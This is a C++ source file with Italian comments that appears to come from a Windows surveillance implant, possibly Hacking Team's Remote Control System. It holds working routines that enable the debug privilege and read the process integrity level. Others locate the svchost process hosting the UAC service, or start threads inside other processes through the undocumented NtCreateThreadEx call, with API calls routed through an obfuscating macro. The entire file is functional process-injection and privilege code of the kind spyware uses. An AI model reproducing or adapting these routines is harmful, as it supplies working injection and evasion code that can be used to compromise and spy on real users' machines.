#include <Windows.h>
#include <rcs/enumprocess.h>
#include "common.h"
#include "HM_VistaSpecific.h"

void SetDebugPrivilege(BOOL to_set)
{
	HANDLE hProc = 0, hProcToken = 0;
	TOKEN_PRIVILEGES tp;
	LUID     luid;

	do {
		if (!(hProc = FNC(OpenProcess)(PROCESS_ALL_ACCESS, true, FNC(GetCurrentProcessId)())))
			break;

		if (!FNC(OpenProcessToken)(hProc, TOKEN_ALL_ACCESS, &hProcToken))
			break;

		if (!FNC(LookupPrivilegeValueA) (NULL, SE_DEBUG_NAME, &luid))
			break;

		ZeroMemory(&tp, sizeof(tp));
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Luid = luid;
		if (to_set)
			tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		else
			tp.Privileges[0].Attributes = 0;

		FNC(AdjustTokenPrivileges) (hProcToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	} while (FALSE);

	if (hProcToken)
		CloseHandle(hProcToken);
	if (hProc)
		CloseHandle(hProc);
}

BOOL IsVista(DWORD* integrity_level)
{
	HANDLE hProc = 0, hProcToken = 0;
	BOOL is_vista = FALSE;
	PTOKEN_MANDATORY_LABEL pTIL = NULL;
	DWORD dwIntegrityLevel;
	DWORD dwLengthNeeded;

	if (integrity_level)
		*integrity_level = IL_UNKNOWN;

	do {
		if (!(hProc = FNC(OpenProcess)(PROCESS_ALL_ACCESS, true, FNC(GetCurrentProcessId)())))
			break;

		if (!FNC(OpenProcessToken)(hProc, TOKEN_ALL_ACCESS, &hProcToken))
			break;

		if (!FNC(GetTokenInformation)(hProcToken, (TOKEN_INFORMATION_CLASS)25, NULL, 0, &dwLengthNeeded)) {
			if (GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
				pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, dwLengthNeeded);
				if (pTIL != NULL) {
					if (FNC(GetTokenInformation)(hProcToken, (TOKEN_INFORMATION_CLASS)25, pTIL, dwLengthNeeded, &dwLengthNeeded)) {
						// Se la FNC(GetTokenInformation) torna OK allora siamo su vista
						is_vista = TRUE;
						dwIntegrityLevel = *FNC(GetSidSubAuthority)(pTIL->Label.Sid, (DWORD)(UCHAR)(*FNC(GetSidSubAuthorityCount)(pTIL->Label.Sid) - 1));

						if (integrity_level) {
							if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
								*integrity_level = IL_LOW;
							else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
								*integrity_level = IL_MEDIUM;
							else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
								*integrity_level = IL_HIGH;
							else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
								*integrity_level = IL_SYSTEM;
						}
					}
					LocalFree(pTIL);
				}
			}
		}

	} while (FALSE);

	if (hProcToken)
		CloseHandle(hProcToken);
	if (hProc)
		CloseHandle(hProc);

	return is_vista;
}

DWORD FindRunAsService()
{
	DWORD service_pid = 0;

	EnumerateProcess process;

	while (process())
	{
		// Vede se e' un svchost
		if (stricmp("svchost.exe", process.pe32.szExeFile))
			continue;

		EnumerateModule modules(process.pe32.th32ProcessID);

		while (modules())
		{
			if (!stricmp("appinfo.dll", modules.me32.szModule))
			{
				service_pid = process.pe32.th32ProcessID;
				break;
			}
		}

		// Quando l'ha trovato finisce
		if (service_pid)
			break;
	}

	return service_pid;
}

HANDLE VistaCreateRemoteThread(HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter)
{
	HANDLE hRemoteThread = NULL;
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
	
	if (pNtCreateThreadEx != NULL)
	{
		DWORD dw0 = 0;
		DWORD dw1 = 0;

		UnkVistaTh thread_desc;

		ZeroMemory(&thread_desc, sizeof(thread_desc));
		thread_desc.Length = 36;
		thread_desc.Unknown1 = 0x10003;
		thread_desc.Unknown2 = 0x8;
		thread_desc.Unknown3 = &dw0;
		thread_desc.Unknown4 = 0;
		thread_desc.Unknown5 = 0x10004;
		thread_desc.Unknown6 = 4;
		thread_desc.Unknown7 = &dw1;
		thread_desc.Unknown8 = 0;

		pNtCreateThreadEx(&hRemoteThread, 0x1FFFFF, NULL, hProcess, lpStartAddress,
			lpParameter, FALSE, NULL, NULL, NULL, &thread_desc);
	}

	return hRemoteThread;
}